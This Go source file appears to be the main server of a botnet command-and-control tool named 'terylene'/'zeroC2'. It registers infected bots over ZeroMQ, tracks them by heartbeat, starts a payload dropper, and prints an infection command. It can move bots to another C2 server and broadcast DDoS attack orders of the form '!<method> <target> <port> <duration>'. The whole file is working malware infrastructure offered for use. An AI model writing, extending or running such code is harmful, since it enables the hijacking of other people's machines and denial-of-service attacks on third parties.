package main

import (
	"bufio"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"sync"
	config "terylene/config"
	dropper "terylene/server/components/dropper"
	"terylene/server/components/transfer"
	poly "terylene/server/theme/default"
	"time"

	"github.com/fatih/color"
	zmq "github.com/pebbe/zmq4"
)

type Botstruc struct {
	arch    string
	OS      string
	localip string
	pubip   string
	connID  string
}

var (
	connIDs     = make(map[string]string)
	tera        = make(map[string]Botstruc)
	aliveclient = make(map[string]time.Time)
	pubmutex    sync.Mutex
	routmutex   sync.Mutex
)

func broadcaster(message, bot string, publisher *zmq.Socket) {
	pubmutex.Lock()
	publisher.Send(fmt.Sprintf("%s:%s", bot, message), 1)
	pubmutex.Unlock()
}

func heartroutsend(router *zmq.Socket) {
	for {
		for id := range connIDs {
			routmutex.Lock()
			router.SendMessage(id, "h")
			routmutex.Unlock()
		}
		time.Sleep(2 * time.Second)
	}
}

func heartpubsend(publisher *zmq.Socket) {
	for {
		broadcaster("h", "terylene", publisher)
		time.Sleep(2 * time.Second)
	}
}

func heartbeatcheck() {
	for {
		for id, last := range aliveclient {
			if time.Since(last) > 5*time.Second {
				delete(aliveclient, id)
				delete(tera, id)
				delete(connIDs, id)
				fmt.Printf("\n\033[1;33mheartbeat monitor: terylene %s has been pronounced dead\033[0m", id)
			}
		}
		time.Sleep(3 * time.Second)
	}
}

func ExistsInMap(m map[string]string, targetValue string) bool {
	for _, value := range m {
		if value == targetValue {
			return true
		}
	}
	return false
}

func clearScreen() {
	cmd := exec.Command("clear")
	cmd.Stdout = os.Stdout
	cmd.Run()
}

func routerhandle(router *zmq.Socket) {
	for {
		msg, err := router.RecvMessage(0)

		go func(msg []string) {
			if err != nil {
				return
			}
			if len(msg) == 0 || len(msg) == 1 {
				return
			}

			//registration
			if len(msg) == 7 {
				if msg[1] == "reg" {
					if ExistsInMap(connIDs, msg[6]) {
						routmutex.Lock()
						router.SendMessage(msg[0], "kys")
						routmutex.Unlock()
					} else {
						bot := Botstruc{
							arch:    msg[2],
							OS:      msg[3],
							localip: msg[4],
							pubip:   msg[5],
							connID:  msg[6],
						}
						tera[msg[0]] = bot
						connIDs[msg[0]] = msg[6]
						routmutex.Lock()
						router.SendMessage(msg[0], "terylene", config.Broadcastport)
						routmutex.Unlock()
					}
				}
			}

			if len(msg) == 2 {
				if len(msg) == 2 {
					if msg[1] == "h" {
						aliveclient[msg[0]] = time.Now()
					} else if msg[1] == "injustice" {
						routmutex.Lock()
						router.SendMessage(msg[0], "justice")
						routmutex.Unlock()
					} else if msg[1] == "isdone" {
						routmutex.Lock()
						router.SendMessage(msg[0], "isserved")
						routmutex.Unlock()
					}
				}
			}

		}(msg)
	}
}

func transferprompt(router *zmq.Socket, scanner *bufio.Scanner) {
	if len(aliveclient) == 0 {
		fmt.Println("you dont have any online bots sadly :(")
		return
	}
	fmt.Printf("target server:")
	scanner.Scan()
	target := strings.TrimSpace(scanner.Text())

	fmt.Printf("router port:")
	scanner.Scan()
	rport := strings.TrimSpace(scanner.Text())

	fmt.Printf("amount of terylene to transfer:")
	scanner.Scan()
	amount := strings.TrimSpace(scanner.Text())

	intamount, err := strconv.Atoi(amount)

	if intamount > len(aliveclient) {
		fmt.Printf("sorry, you only have %d bots", len(aliveclient))
	}
	if err != nil {
		fmt.Println("botnet input is invalid")
		return
	}
	err = transfer.Transfercheck(target, rport)
	if err != nil {
		fmt.Println("Server check failed, stopped transfer")
	} else {
		fmt.Printf("server check passed, initiating transfer of %d botnets\n", intamount)
		count := 0
		for id := range aliveclient {
			routmutex.Lock()
			router.SendMessage(id, "migrate", target, rport)
			fmt.Println(connIDs)
			fmt.Println(connIDs[id])
			routmutex.Unlock()
			delete(aliveclient, id)
			delete(tera, id)
			if count == intamount {
				break
			}
		}
		fmt.Println("operation successful!!!")
	}
}
func getpubIp() string {
	url := "https://api.ipify.org?format=text"
	resp, err := http.Get(url)
	if err != nil {
		return "<your ip>"
	}
	defer resp.Body.Close()
	ip, err := io.ReadAll(resp.Body)
	if err != nil {
		return "<your ip>"
	}
	return string(ip)
}

func main() {
	scanner := bufio.NewScanner(os.Stdin)

	title := poly.Title
	help := poly.Help
	methods_list := poly.Methods
	cmdtext := poly.Cmd
	Ddosmsg := poly.Ddosmsg
	terminalcolor := color.New(color.FgCyan).Add(color.BgHiBlack)

	clearScreen()

	color.Cyan(title)

	time.Sleep(50 * time.Millisecond)

	color.Cyan("[...]starting zeroC2 broadcast server")

	publisher, err := zmq.NewSocket(zmq.PUB)

	defer publisher.Close()

	if err != nil {
		fmt.Println(err)
		color.Red("[X]error starting zeroC2 broadcast")
		os.Exit(1)
	}

	err = publisher.Bind(fmt.Sprintf("tcp://%s:%s", config.C2ip, config.Broadcastport))

	if err != nil {
		fmt.Println(err)
		color.Red("[X] error binding port %s", config.Broadcastport)
		os.Exit(1)
	}

	time.Sleep(50 * time.Millisecond)
	color.Green("[✔] successfully started zeroC2 broadcast")
	time.Sleep(50 * time.Millisecond)
	color.Cyan("[...]starting zeroC2 router server")

	router, err := zmq.NewSocket(zmq.ROUTER)

	if err != nil {
		color.Red("[X] error creating router socket")
	}
	defer router.Close()

	err = router.Bind(fmt.Sprintf("tcp://%s:%s", config.C2ip, config.Routerport))

	router.SetLinger(0)
	if err != nil {
		fmt.Println(err)
		color.Red("[X] error binding port %s", config.Routerport)
		os.Exit(1)
	}

	go heartroutsend(router)
	go heartpubsend(publisher)
	go heartbeatcheck()

	color.Green("[✔] successfully started zeroC2 router")

	color.Cyan("[...]starting zeroC2 dropper")
	go dropper.Dropstart()
	color.Green("[✔] successfully started zeroC2 dropper")

	fmt.Print("press enter to continue...")
	scanner.Scan()

	clearScreen()
	fmt.Print(poly.Welcome)
	go routerhandle(router)

	for {
		terminalcolor.Printf(cmdtext)
		scanner.Scan()

		command := scanner.Text()
		command = strings.TrimSpace(command)
		if scanner.Err() != nil {
			fmt.Println("an error has occured", scanner.Err())
			break
		}
		switch command {
		case "help":
			fmt.Println(help)
			continue
		case "clear":
			clearScreen()
			continue
		case "exit":
			publisher.Close()
			color.Red("[✔] successfully shutdown broadcast")
			router.Close()
			color.Red("[✔] successfully shutdown router")
			os.Exit(1)
		case "methods":
			fmt.Println(methods_list)
		case "list":
			fmt.Println("Number of bots:", len(aliveclient))
			for _, bot := range tera {
				fmt.Printf("Bot ID: %s \narch: %s\nOS: %s\npublic ip: %s\n", bot.connID, bot.arch, bot.OS, bot.pubip)
			}
		case "payload":
			fmt.Println("terylene payload:")
			if config.C2ip == "0.0.0.0" {
				newC2ip := getpubIp()
				fmt.Println(fmt.Sprintf(config.Infcommand, newC2ip))
				continue
			}
			fmt.Println(fmt.Sprintf(config.Infcommand, config.C2ip))
		case "transfer":
			transferprompt(router, scanner)
		case "killall":
			broadcaster(command, "terylene", publisher)
			clearScreen()
			fmt.Println("All terylene connection killed")
		}
		if strings.Contains(command, "!") {
			containsBlocked := false
			for _, value := range config.Methods {
				if strings.Contains(command, value) {
					for _, block := range config.Blocked {
						if strings.Contains(command, block) {
							containsBlocked = true
						}
					}
					if containsBlocked {
						break
					}
					parts := strings.Fields(command)
					if len(parts) == 4 {
						_, err := strconv.Atoi(parts[2])
						if err != nil {
							continue
						}
						_, err = strconv.Atoi(parts[3])
						if err != nil {
							continue
						}
						broadcaster(command, "terylene", publisher)
						clearScreen()
						fmt.Println(Ddosmsg)
					} else {
						fmt.Println("format: !<method> <target> <port> <duration>")
					}
					break
				}
			}
		}

	}
}
